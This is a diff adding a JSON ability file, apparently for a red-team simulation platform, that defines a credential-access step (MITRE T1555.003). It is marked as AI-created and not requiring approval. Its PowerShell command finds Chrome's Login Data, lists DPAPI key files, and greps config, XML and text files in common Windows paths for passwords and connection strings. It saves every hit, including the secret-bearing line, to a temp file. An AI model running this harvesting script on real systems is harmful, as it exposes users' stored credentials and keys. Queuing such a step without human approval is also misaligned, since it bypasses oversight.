@@ -1,0 +1,37 @@
+{
+  "ability_id": "7c16d2d3-d0c2-4c45-9b41-2ca2776fb291",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:43:09.965969+00:00",
+  "ability": {
+    "name": "DPAPI / Browser & Configuration Credential Hunt",
+    "description": "Searches files and profile directories for cached credentials, DPAPI keys, and Chrome databases.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1555.003",
+    "platform": "windows",
+    "impact_type": "read",
+    "default_severity": "medium",
+    "requires_approval": false,
+    "tags": [
+      "dpapi",
+      "browser",
+      "plain-text-credentials"
+    ],
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Audit DPAPI, browser directories, and configurations",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $results = @(); $chromePath = \\\"$env:USERPROFILE\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\"; if (Test-Path $chromePath) { $results += \\\"Found Chrome Login Data at: $chromePath\\\" }; $dpapiPath = \\\"$env:APPDATA\\\\Microsoft\\\\Protect\\\"; if (Test-Path $dpapiPath) { $results += \\\"Found DPAPI folders at: $dpapiPath\\\"; Get-ChildItem -Path $dpapiPath -Recurse -File -ErrorAction SilentlyContinue | foreach { $results += \\\"DPAPI: $($_.FullName)\\\" } }; $searchDirs = @(\\\"C:\\\\inetpub\\\", \\\"C:\\\\Windows\\\\Panther\\\", \\\"$env:USERPROFILE\\\\Documents\\\"); foreach ($dir in $searchDirs) { if (Test-Path $dir) { $files = Get-ChildItem -Path $dir -Recurse -Include *.config,*.xml,*.txt,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern \\\"password\\\",\\\"passwd\\\",\\\"connectionString\\\",\\\"credentials\\\" -ErrorAction SilentlyContinue; foreach ($match in $files) { $results += \\\"Found potential credential in file: $($match.Path) Line: $($match.LineNumber) - $($match.Line)\\\" } } }; if ($results.Count -eq 0) { $results += \\\"No potential credentials or DPAPI/browser secrets detected in audited paths\\\" }; $results -join [char]13+[char]10 } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\dpapi_browser.txt",
+      "timeout_seconds": 90,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Triage and extract configuration secrets, Chrome credentials, and DPAPI structures.",
+  "provider": "Lead Red Team Operator",
+  "cited_urls": [
+    "https://attack.mitre.org/techniques/T1555/003/"
+  ]
+}
